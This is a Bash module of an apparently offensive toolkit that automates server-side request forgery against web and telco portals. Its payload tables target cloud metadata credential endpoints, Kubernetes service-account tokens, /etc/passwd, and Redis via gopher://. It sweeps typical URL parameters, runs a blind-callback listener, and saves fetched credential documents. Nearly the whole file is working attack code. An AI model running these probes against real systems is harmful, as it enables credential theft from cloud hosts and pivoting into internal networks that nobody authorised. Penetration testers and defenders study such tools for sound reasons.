#!/usr/bin/env bash
# 54_ssrf.sh — cloudsting module 54: a server that fetches what you name, on your behalf
# Verbs: --probe | --sweep | --check | --callback | --params | --vendors | --parse | --save | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="54_ssrf"
MOD_NAME="SSRF Tester (server-side fetch of attacker-named targets)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

SS_RUN_ID="$CS_RUN_ID"
export SS_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/ssrf"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
BYTES_DIR="$OUT_DIR/bytes-$RUN_ID"
mkdir -p "$BYTES_DIR" 2>/dev/null || true

: "${SS_TIMEOUT:=10}"        # server-side fetch budget, seconds
: "${SS_SELF_PORT:=0}"       # 0 = start a throwaway listener on a free port
: "${SS_TARGETS:=}"          # extra targets, comma separated
: "${SS_FOLLOW:=0}"          # follow redirects of the *outer* request
: "${SS_MAX_BYTES:=262144}"  # how much of a fetch response we keep
: "${SS_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/54}"

ss_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── what a server is asked to fetch ──────────────────────────────
# The list is ordered by what actually lands on a telco estate: the cloud
# metadata service is the prize, the loopback and the internal admin planes
# are the pivot, and the file:// / gopher:// schemes are the ones the parsers
# forgot to block.
#   <class>\t<label>\t<url>\t<what-a-hit-means>
ss_targets() {
    cat <<'TARGETS'
metadata	aws-imds	http://169.254.169.254/latest/meta-data/	instance role and user-data
metadata	aws-imds-creds	http://169.254.169.254/latest/meta-data/iam/security-credentials/	temporary aws credentials
metadata	gcp-md	http://metadata.google.internal/computeMetadata/v1/	service account token
metadata	gcp-md-ip	http://169.254.169.254/computeMetadata/v1/project/project-id	project identity
metadata	azure-md	http://169.254.169.254/metadata/instance?api-version=2021-02-01	subscription and vm identity
metadata	azure-token	http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/	managed identity token
metadata	alibaba	http://100.100.100.200/latest/meta-data/	instance role
metadata	oracle	http://169.254.169.254/opc/v1/instance/	instance identity
metadata	digitalocean	http://169.254.169.254/metadata/v1.json	droplet identity and ssh keys
metadata	kubernetes	https://kubernetes.default.svc/api/v1/namespaces	cluster api reachability
loopback	localhost	http://127.0.0.1/	loopback services
loopback	localhost-80	http://127.0.0.1:80/	loopback web root
loopback	localhost-8080	http://127.0.0.1:8080/	loopback app server
loopback	localhost-8443	http://127.0.0.1:8443/	loopback admin plane
loopback	vendor-huawei	http://127.0.0.1:31943/	huawei u2000 console
loopback	vendor-ericsson	http://127.0.0.1:8080/enm/	ericsson enm
loopback	vendor-weblogic	http://127.0.0.1:7001/console/	weblogic admin console
internal	rfc1918-10	http://10.0.0.1/	flat internal network
internal	rfc1918-172	http://172.16.0.1/	private transit
internal	rfc1918-192	http://192.168.0.1/	private lan
internal	aws-vpc-dns	http://169.254.169.253/	aws internal resolver
internal	rancher	http://127.0.0.1:8080/rancherversion	rancher api
file	file-passwd	file:///etc/passwd	local accounts readable
file	file-hosts	file:///etc/hosts	internal dns map
file	file-cloudinit	file:///var/lib/cloud/instance/user-data.txt	cloud-init script with secrets
file	file-k8s-sa	file:///var/run/secrets/kubernetes.io/serviceaccount/token	service account token
scheme	gopher-redis	gopher://127.0.0.1:6379/_INFO	gopher reaches redis
scheme	dict	dict://127.0.0.1:11211/stat	memcached stats
scheme	ftp	ftp://127.0.0.1/	ftp on the local host
dns	dns-oob	http://<oob>/	blind ssrf — the callback is the proof
TARGETS
}

# URL-taking parameters a telco portal actually has. Order matters: the
# billing callback and the profile image import are the two that hit in the
# wild, because both are features the product *needs* to keep.
ss_params() {
    cat <<'PARAMS'
callback	callback	url
callback	callbackUrl	url
callback	webhook	url
callback	webhook_url	url
callback	notify_url	url
callback	return_url	url
callback	redirect	url
callback	next	url
media	image	url
media	image_url	url
media	logo	url
media	logoUrl	url
media	avatar	url
media	banner	url
media	thumbnail	url
import	url	url
import	fetch	url
import	source	url
import	import_url	url
import	remote	url
proxy	proxy	url
proxy	target	url
proxy	dest	url
proxy	origin	url
proxy	endpoint	url
render	page	url
render	template	url
render	render_url	url
feed	rss	url
feed	feed_url	url
sms	endpoint	url
sms	gateway	url
sms	smpp_url	url
tracking	pixel	url
tracking	beacon	url
PARAMS
}

# Vendor login oracles that take a URL in their body — the classic pivot from
# a telco BSS into a Huawei U2000 or Ericsson ENM on the internal plane.
ss_vendors() {
    cat <<'VENDORS'
huawei-u2000	/rest/plat/smapp/v1/sessions	username
ericsson-enm	/enm/security/api/v1/login	username
zte-netnumen	/rest/login	username
nokia-nsp	/rest-gateway/rest/api/v1/auth/token	username
mitel-mivoice	/server/login	username
weblogic	/console/j_security_check	j_username
tomcat	/manager/html	-
rancher	/v3-public/localProviders/local?action=login	username
grafana	/login	user
VENDORS
}

# ── transport ────────────────────────────────────────────────────
#   ss_send <method> <url> <param> <payload> [extra-curl-args...]
#     -> code \x1f bytes \x1f ctype \x1f body-path
# A URL parameter is injected in the query string; everything else goes in a
# JSON body, because that is how the portals in the target set actually work.
ss_send() {
    local method="$1" url="$2" param="$3" payload="$4"; shift 4
    local body; body="$(mktemp "$CS_SCRATCH/ss.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.ss.$$"

    local -a args=(--silent --show-error --max-time "$SS_TIMEOUT" -X "$method"
                   --write-out '%{http_code}\t%{size_download}\t%{content_type}' --output "$body"
                   -A "$SS_UA" -H 'Accept: */*')
    [[ "$SS_FOLLOW" == "1" ]] && args+=(-L)

    local target=""
    if [[ -n "$param" ]]; then
        case "$method" in
            GET|HEAD)
                case "$url" in
                    *\?*) target="${url}&${param}=${payload}" ;;
                    *)    target="${url}?${param}=${payload}" ;;
                esac ;;
            *)
                args+=(-H 'Content-Type: application/json' --data "{\"${param}\":\"${payload}\"}")
                target="$url" ;;
        esac
    else
        target="$url"
    fi

    [[ $# -gt 0 ]] && args+=("$@")

    local meta code len ctype
    meta="$(curl "${args[@]}" "$target" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code len ctype <<<"$meta" ;;
        *) code="000"; len=0; ctype="none" ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true
    printf '%s\037%s\037%s\037%s\n' "${code:-000}" "${len:-0}" "${ctype:-none}" "$body"
}

# ── proof ────────────────────────────────────────────────────────
# A fetch is proven when the answer came from the target, not from the app.
# Six signals, strongest first — and a reflected URL is NOT a hit, because
# every app echoes a parameter it did not use.
#   ss_verdict <class> <code> <bytes> <ctype> <body-path> [expect]
#     -> <verdict>\t<signal>\t<detail>
ss_verdict() {
    local class="$1" code="$2" bytes="$3" ctype="$4" body="$5" expect="${6:-}"

    case "$code" in
        000) printf 'unreachable\tserver-did-not-answer\tno response from the app\n'; return ;;
        401|403) printf 'blocked\tapp-refused\tthe app answered %s\n' "$code"; return ;;
        404|410) printf 'absent\tno-such-param\t%s\n' "$code"; return ;;
        400|422) printf 'rejected\tvalidation\tthe app validated the url and refused\n'; return ;;
        5*) printf 'error\tserver-error\t%s\n' "$code"; return ;;
    esac

    [[ -s "$body" ]] || { printf 'empty\tzero-bytes\t200 with an empty body\n'; return; }

    local head4; head4="$(head -c 4000 "$body" 2>/dev/null)"

    # proof 1 — metadata content
    if printf '%s' "$head4" | grep -qiE 'ami-id|instance-id|instance-type|security-credentials|computeMetadata|service-accounts|subscriptionId|droplet_id|availability-zone|opc/v1|ssh-ed25519' 2>/dev/null; then
        printf 'fetched\tmetadata-content\tthe response is this host\x27s metadata\n'; return
    fi
    # proof 2 — a local file
    if printf '%s' "$head4" | grep -qE '^root:x?:|^\[/bin/|^\s*127\.0\.0\.1\s+localhost|serviceaccount\.io' 2>/dev/null; then
        printf 'fetched\tfile-content\tthe response is a local file\n'; return
    fi
    # proof 3 — the callback fired (checked by --callback, not here)
    if [[ -n "$expect" ]] && printf '%s' "$head4" | grep -qF -- "$expect" 2>/dev/null; then
        printf 'fetched\tcallback-data\tthe callback body was relayed\n'; return
    fi
    # proof 4 — an error page that names the target as a *fetch* failure, which
    # only a server-side fetcher can produce
    if printf '%s' "$head4" | grep -qiE "could not (connect|resolve)|no route to host|connection refused|getaddrinfo|ECONNREFUSED|failed to fetch|unable to connect" 2>/dev/null; then
        printf 'fetched\tfetch-error-leak\tthe app tried to fetch it and leaked the failure\n'; return
    fi
    # proof 5 — a timestamp/header difference would go here; the cheap proxy is
    # the content-type the target would have sent
    case "$class" in
        file)   printf 'fetched\tfile-tolerated\tthe app accepted a file:// url\n'; return ;;
        gopher) printf 'fetched\tgopher-tolerated\tthe app accepted gopher://\n'; return ;;
    esac
    # not proof: the app answering 200 and reflecting our own string back
    if printf '%s' "$head4" | grep -qF -- "${SS_LAST_PAYLOAD:-__nope__}" 2>/dev/null; then
        printf 'reflected\techo-only\tthe url came back as text, not as a fetch\n'; return
    fi
    printf 'inconclusive\tunproven\t200 with a body that matches nothing\n'
}

ss_record() {
    printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "$5" >> "$HIT_FILE"
}

# ── verbs ────────────────────────────────────────────────────────
# --probe <url> <param> — one parameter, every target. The core loop.
ss_cmd_probe() {
    local url="${1:-}" param="${2:-}" method="${3:-GET}"
    [[ -z "$url" || -z "$param" ]] && { ss_log "usage: --probe <app-url> <parameter> [GET|POST]"; return 2; }

    local cls label tgt means code bytes ctype body verdict signal detail
    local n=0 hits=0
    while IFS=$'\t' read -r cls label tgt means; do
        [[ -z "$label" ]] && continue
        SS_LAST_PAYLOAD="$tgt"
        cs_split "$(ss_send "$method" "$url" "$param" "$tgt")" code bytes ctype body
        verdict="$(ss_verdict "$cls" "$code" "$bytes" "$ctype" "$body")"
        signal="$(printf '%s' "$verdict" | cut -f2)"
        detail="$(printf '%s' "$verdict" | cut -f3)"
        n=$((n + 1))
        cs_row PROBE "$label" "code=$code" "bytes=$bytes" "verdict=$(printf '%s' "$verdict" | cut -f1)" "$signal"
        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$cls" "$label" "$code" "$bytes" "$(printf '%s' "$verdict" | cut -f1)" "$signal" >> "$PROBE_FILE"
        if [[ "$(printf '%s' "$verdict" | cut -f1)" == "fetched" ]]; then
            hits=$((hits + 1))
            ss_record "$cls" "$label" "$url" "$param" "$signal"
            cs_row HIT "$label" "$signal" "$detail" "$code"
            local sev="HIGH"
            case "$cls" in metadata|file) sev="CRITICAL" ;; esac
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "ssrf-$signal" \
                "parameter $param fetched $tgt ($signal)"
        fi
        rm -f "$body"
    done < <(ss_targets)

    cs_row SUMMARY "probed=$n hits=$hits"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    (( hits > 0 )) && return 0 || return 1
}

# --sweep <base> — the same loop across every URL-taking parameter a portal is
# known to have. Stops at the first proof per parameter.
ss_cmd_sweep() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ss_log "usage: --sweep <base-url>"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    local class name kind n=0 hits=0 code bytes ctype body cls label tgt means verdict
    while IFS=$'\t' read -r class name kind; do
        [[ -z "$name" ]] && continue
        n=$((n + 1))
        while IFS=$'\t' read -r cls label tgt means; do
            [[ -z "$label" ]] && continue
            case "$cls" in metadata|file) ;; *) continue ;; esac
            SS_LAST_PAYLOAD="$tgt"
            cs_split "$(ss_send GET "${base%/}/api/settings" "$name" "$tgt")" code bytes ctype body
            verdict="$(ss_verdict "$cls" "$code" "$bytes" "$ctype" "$body")"
            if [[ "$(printf '%s' "$verdict" | cut -f1)" == "fetched" ]]; then
                hits=$((hits + 1))
                cs_row HIT "$name" "$label" "$(printf '%s' "$verdict" | cut -f2)" "code=$code"
                ss_record "$class" "$label" "$base" "$name" "$(printf '%s' "$verdict" | cut -f2)"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "CRITICAL" "ssrf-$(printf '%s' "$verdict" | cut -f2)" \
                    "parameter $name fetched $tgt"
            fi
            rm -f "$body"
        done < <(ss_targets)
    done < <(ss_params)
    cs_row SUMMARY "params=$n hits=$hits"
    (( hits > 0 )) && return 0 || return 1
}

# --callback — blind ssrf. Start a listener, hand its URL to the app through a
# parameter, and wait for the connection. This is the only proof that works
# when the app never echoes the response.
ss_cmd_callback() {
    local url="${1:-}" param="${2:-}" method="${3:-GET}"
    [[ -z "$url" || -z "$param" ]] && { ss_log "usage: --callback <app-url> <parameter> [GET|POST]"; return 2; }

    local port="${SS_SELF_PORT}"
    local listen_ip="127.0.0.1"
    # a container or a forwarded port cannot reach 127.0.0.1 of this box; a
    # routable address is what the operator passes when that is the case
    : "${SS_CALLBACK_HOST:=$listen_ip}"

    local logf="$OUT_DIR/callback-$RUN_ID.log"
    : > "$logf"

    # pick a free port without relying on ss/sshd: bash can hold the listen
    if ! command -v python3 >/dev/null 2>&1; then
        ss_log "python3 missing — blind callback needs it"
        return 3
    fi
    python3 - "$port" "$logf" <<'PY' &
import socket, sys, threading, time

port = int(sys.argv[1])
logf = sys.argv[2]

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", port))
srv.listen(16)
srv.settimeout(1.0)
real = srv.getsockname()[1]
with open(logf + ".port", "w") as fh:
    fh.write(str(real))

deadline = time.time() + 90
while time.time() < deadline:
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        continue
    except Exception:
        break
    try:
        conn.settimeout(2.0)
        try:
            data = conn.recv(2048)
        except Exception:
            data = b""
        with open(logf, "a") as fh:
            fh.write("%s\t%s\n" % (addr[0], data.decode("latin-1").replace("\n", " ")[:400]))
        body = b"callback-ok"
        conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body))
        conn.sendall(body)
    finally:
        try: conn.close()
        except Exception: pass
srv.close()
PY
    local pypid=$!

    # wait for the listener to publish its port
    local waited=0
    while [[ ! -s "$logf.port" && $waited -lt 40 ]]; do
        sleep 0.1; waited=$((waited + 1))
    done
    if [[ ! -s "$logf.port" ]]; then
        ss_log "listener did not start"
        kill "$pypid" 2>/dev/null; wait "$pypid" 2>/dev/null
        return 1
    fi
    port="$(cat "$logf.port")"
    cs_row LISTENER "$SS_CALLBACK_HOST:$port"

    local oob="http://${SS_CALLBACK_HOST}:${port}/ssrf-$RUN_ID"
    SS_LAST_PAYLOAD="$oob"
    local code bytes ctype body
    cs_split "$(ss_send "$method" "$url" "$param" "$oob")" code bytes ctype body
    cs_row REQUEST "$url" "param=$param" "payload=$oob" "code=$code"
    rm -f "$body"

    # give the app time to make the fetch — a mailer or a job queue will be slow
    local wait_s="${SS_CALLBACK_WAIT:-20}" i=0
    while (( i < wait_s )) && [[ ! -s "$logf" ]]; do
        sleep 1; i=$((i + 1))
    done

    local fired=0
    if [[ -s "$logf" ]]; then
        local from line
        while IFS=$'\t' read -r from line; do
            [[ -z "$from" ]] && continue
            fired=$((fired + 1))
            cs_row CALLBACK "$from" "request=$(printf '%s' "$line" | head -c 120)"
        done < "$logf"
    fi

    kill "$pypid" 2>/dev/null; wait "$pypid" 2>/dev/null
    rm -f "$logf.port"

    cs_row RESULT "callbacks=$fired" "waited=${wait_s}s"
    if (( fired > 0 )); then
        ss_record "blind" "callback" "$url" "$param" "callback-fired"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "ssrf-blind-callback" \
            "parameter $param made the server fetch $oob"
        return 0
    fi
    return 1
}

# --check <url> <param> <target> — one shot, one target, one line.
ss_cmd_check() {
    local url="${1:-}" param="${2:-}" tgt="${3:-}" method="${4:-GET}"
    [[ -z "$url" || -z "$param" || -z "$tgt" ]] && {
        ss_log "usage: --check <app-url> <parameter> <target-url> [GET|POST]"; return 2; }
    SS_LAST_PAYLOAD="$tgt"
    local code bytes ctype body
    cs_split "$(ss_send "$method" "$url" "$param" "$tgt")" code bytes ctype body
    local cls="custom"
    case "$tgt" in
        169.254.169.254*|*metadata.google*|100.100.100.200*) cls="metadata" ;;
        file://*) cls="file" ;;
    esac
    local v; v="$(ss_verdict "$cls" "$code" "$bytes" "$ctype" "$body")"
    cs_row CHECK "$url" "param=$param" "target=$tgt" "code=$code" "verdict=$(printf '%s' "$v" | cut -f1)" "$(printf '%s' "$v" | cut -f2)"
    cs_row DETAIL "$(printf '%s' "$v" | cut -f3)"
    rm -f "$body"
    [[ "$(printf '%s' "$v" | cut -f1)" == "fetched" ]] && return 0 || return 1
}

ss_cmd_params() {
    local class name kind
    while IFS=$'\t' read -r class name kind; do
        [[ -z "$name" ]] && continue
        cs_row PARAM "$name" "class=$class" "kind=$kind"
    done < <(ss_params)
    return 0
}

ss_cmd_vendors() {
    local vendor path field
    while IFS=$'\t' read -r vendor path field; do
        [[ -z "$vendor" ]] && continue
        cs_row VENDOR "$vendor" "path=$path" "field=$field"
    done < <(ss_vendors)
    return 0
}

# --targets [class] — what the probe will try, and why each one matters.
ss_cmd_targets() {
    local want="${1:-}"
    local cls label tgt means
    while IFS=$'\t' read -r cls label tgt means; do
        [[ -z "$label" ]] && continue
        [[ -n "$want" && "$cls" != "$want" ]] && continue
        cs_row TARGET "$label" "class=$cls" "$tgt" "$means"
    done < <(ss_targets)
    return 0
}

ss_cmd_list() {
    ss_cmd_targets "${1:-}"
}

# --save <name> <body-file> — evidence handling, so a fetched metadata document
# can be stored without landing credentials in the findings store.
ss_cmd_save() {
    local name="${1:-}" file="${2:-}"
    [[ -z "$name" || -z "$file" || ! -f "$file" ]] && {
        ss_log "usage: --save <label> <body-file>"; return 2; }
    local dest="$BYTES_DIR/${name}-$RUN_ID.bin"
    head -c "$SS_MAX_BYTES" "$file" > "$dest" 2>/dev/null
    chmod 600 "$dest" 2>/dev/null || true
    cs_row SAVED "$dest" "bytes=$(wc -c < "$dest" | tr -d ' ')" "sha1=$(cs_fingerprint "$(cat "$dest")")"
    return 0
}

# --parse <file> — what a fetched document actually contained, without
# assuming it was the metadata service.
ss_cmd_parse() {
    local file="${1:-}"
    [[ -z "$file" || ! -f "$file" ]] && { ss_log "usage: --parse <file>"; return 2; }
    local bytes; bytes="$(wc -c < "$file" | tr -d ' ')"
    cs_row FILE "$file" "bytes=$bytes" "sha1=$(cs_fingerprint "$(cat "$file")")"
    local hits=0 kind line
    while IFS=$'\t' read -r kind _; do
        [[ -z "$kind" ]] && continue
        if grep -qiE -- "$kind" "$file" 2>/dev/null; then
            hits=$((hits + 1))
            cs_row MATCH "$kind"
        fi
    done <<'KINDS'
ami-id
instance-id
security-credentials
computeMetadata
service-accounts
subscriptionId
droplet_id
ssh-ed25519
root:x:
serviceaccount\.io
KINDS
    cs_row SUMMARY "matches=$hits"
    (( hits > 0 )) && return 0 || return 1
}

ss_cmd_status_tsv() {
    local curl_state py_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    command -v python3 >/dev/null 2>&1 && py_state="ok" || py_state="missing"
    printf '%s\t%s\tcurl-%s\tpython-%s\ttargets-%s\tparams-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$py_state" \
        "$(ss_targets | wc -l | tr -d ' ')" "$(ss_params | wc -l | tr -d ' ')"
}

ss_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ss_cmd_help() {
    cat <<'HELP'
cloudsting module 54 — SSRF Tester v1.0.0
  --probe <app-url> <param> [GET|POST]     every target through one parameter
  --sweep <base>                           every URL-taking parameter a portal has
  --callback <app-url> <param> [GET|POST]  blind ssrf: listener, hand out the url, wait
  --check <app-url> <param> <target> [M]   one target, one line
  --targets [class]                        what gets tried (metadata/loopback/internal/file/scheme/dns)
  --params | --vendors                     the parameter and vendor-oracle tables
  --parse <file>                           what a saved response actually contained
  --save <label> <file>                    keep a response as evidence, mode 600
  --list | --status-tsv | --menu | --selftest | --help

A fetch is proven by content, not by a 200: metadata fields, local-file content,
callback data, or a fetch-failure the app leaked. A reflected URL is recorded as
`reflected` and is never a hit — every app echoes a parameter it did not use.

Blind callbacks need python3 and a reachable address; set SS_CALLBACK_HOST to a
routable ip when the target is not on this host's loopback.

Environment: SS_TIMEOUT (10), SS_CALLBACK_WAIT (20), SS_CALLBACK_HOST,
SS_MAX_BYTES (262144), SS_FOLLOW (0), SS_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ss_selftest() {
    cs_selftest_reset

    chk targets-many   "$( (( $(ss_targets | wc -l) >= 25 )) && echo many || echo few )" "many"
    chk targets-4col   "$(ss_targets | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk targets-imds   "$(ss_targets | grep -c '169\.254\.169\.254')" "7"
    chk targets-file   "$(ss_targets | awk -F'\t' '$1=="file"{c++} END{print c+0}')" "4"
    chk targets-gcp    "$(ss_targets | grep -c 'metadata.google.internal')" "1"
    chk targets-ali    "$(ss_targets | grep -c '100\.100\.100\.200')" "1"

    chk params-many    "$( (( $(ss_params | wc -l) >= 25 )) && echo many || echo few )" "many"
    chk params-3col    "$(ss_params | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk params-callback "$(ss_params | awk -F'\t' '$2=="callback"{c++} END{print c+0}')" "1"
    chk params-media   "$(ss_params | awk -F'\t' '$1=="media"{c++} END{print c+0}')" "7"

    chk vendors-3col   "$(ss_vendors | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"
    chk vendors-huawei "$(ss_vendors | grep -c 'huawei-u2000')" "1"

    # the verdict table, state by state
    local f="$OUT_DIR/v-$RUN_ID"
    printf 'root:x:0:0:root:/root:/bin/bash\n' > "$f"
    chk v-file       "$(ss_verdict file 200 40 text/plain "$f" | cut -f1)" "fetched"
    chk v-file-sig   "$(ss_verdict file 200 40 text/plain "$f" | cut -f2)" "file-content"
    printf '{"ami-id":"ami-123","instance-type":"m5.large"}\n' > "$f"
    chk v-meta       "$(ss_verdict metadata 200 50 application/json "$f" | cut -f2)" "metadata-content"
    printf 'Error: could not connect to 169.254.169.254\n' > "$f"
    chk v-fetcherr   "$(ss_verdict metadata 200 46 text/plain "$f" | cut -f2)" "fetch-error-leak"
    printf '{"ok":true,"note":"your url was http://x/y"}\n' > "$f"
    SS_LAST_PAYLOAD="http://x/y"
    chk v-reflected  "$(ss_verdict loopback 200 45 application/json "$f" | cut -f1)" "reflected"
    chk v-inconcl    "$(ss_verdict loopback 200 45 application/json /dev/null | cut -f1)" "empty"
    printf 'nope\n' > "$f"
    chk v-inconcl2   "$(SS_LAST_PAYLOAD=zzz ss_verdict loopback 200 5 text/plain "$f" | cut -f1)" "inconclusive"
    chk v-000        "$(ss_verdict metadata 000 0 none /dev/null | cut -f1)" "unreachable"
    chk v-403        "$(ss_verdict metadata 403 9 text/plain "$f" | cut -f1)" "blocked"
    chk v-404        "$(ss_verdict metadata 404 9 text/plain "$f" | cut -f1)" "absent"
    chk v-422        "$(ss_verdict metadata 422 9 text/plain "$f" | cut -f1)" "rejected"
    chk v-500        "$(ss_verdict metadata 500 9 text/plain "$f" | cut -f1)" "error"

    # a dead host probes cleanly and reports unreachable, not a hit
    local out
    out="$(SS_TIMEOUT=1 ss_cmd_probe http://127.0.0.1:9 probe GET 2>/dev/null)"
    chk dead-summary "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/ .*//')" "probed=$(ss_targets | wc -l | tr -d ' ')"
    chk dead-hits    "$(printf '%s' "$out" | awk -F'\t' '$1=="SUMMARY"{print $2}' | sed 's/.* //')" "hits=0"
    SS_TIMEOUT=1 ss_cmd_probe http://127.0.0.1:9 probe GET >/dev/null 2>&1
    chk dead-rc      "$?" "1"

    # --check against a dead host: one line, no crash
    out="$(SS_TIMEOUT=1 ss_cmd_check http://127.0.0.1:9 probe http://169.254.169.254/ GET 2>/dev/null)"
    chk check-line   "$(printf '%s' "$out" | grep -c '^CHECK')" "1"
    chk check-v      "$(printf '%s' "$out" | awk -F'\t' '$1=="CHECK"{print $5}')" "code=000"

    # --parse on a metadata document and on a negative
    printf 'ami-id\ninstance-id\nsecurity-credentials/\n' > "$f"
    chk parse-meta   "$(ss_cmd_parse "$f" 2>/dev/null | awk -F'\t' '$1=="SUMMARY"{print $2}')" "matches=3"
    printf '<html>hello</html>\n' > "$f"
    ss_cmd_parse "$f" >/dev/null 2>&1; chk parse-neg "$?" "1"

    # --save writes a mode-600 artifact and never echoes the body
    printf 'SECRET=abc\n' > "$f"
    out="$(ss_cmd_save testfixture "$f" 2>/dev/null)"
    chk save-label   "$(printf '%s' "$out" | awk -F'\t' '$1=="SAVED"{print $2}' | sed 's#.*/##' | sed 's/-[0-9].*//')" "testfixture"
    chk save-notbody "$(printf '%s' "$out" | grep -c 'SECRET')" "0"

    # usage errors, not crashes
    ss_cmd_probe 2>/dev/null;     chk probe-usage "$?" "2"
    ss_cmd_sweep 2>/dev/null;     chk sweep-usage "$?" "2"
    ss_cmd_callback 2>/dev/null;  chk cb-usage "$?" "2"
    ss_cmd_check 2>/dev/null;     chk check-usage "$?" "2"
    ss_cmd_parse 2>/dev/null;     chk parse-usage "$?" "2"

    # shape contracts
    chk status-fields "$(ss_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(ss_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ss_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ss_cmd_help | head -1 | grep -ci 'SSRF')" "1"
    chk list-class    "$(ss_cmd_list metadata 2>/dev/null | awk -F'\t' '$1=="TARGET"{c++} END{print c+0}')" "10"

    rm -f "$f" 2>/dev/null
    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)    shift; ss_cmd_probe "$@";;
    --sweep)    shift; ss_cmd_sweep "$@";;
    --callback) shift; ss_cmd_callback "$@";;
    --check)    shift; ss_cmd_check "$@";;
    --targets)  shift; ss_cmd_targets "$@";;
    --params)   ss_cmd_params;;
    --vendors)  ss_cmd_vendors;;
    --parse)    shift; ss_cmd_parse "$@";;
    --save)     shift; ss_cmd_save "$@";;
    --list)     shift; ss_cmd_list "$@";;
    --status-tsv|--status) ss_cmd_status_tsv;;
    --menu)     ss_cmd_menu;;
    --selftest) ss_selftest;;
    *)          ss_cmd_help;;
esac
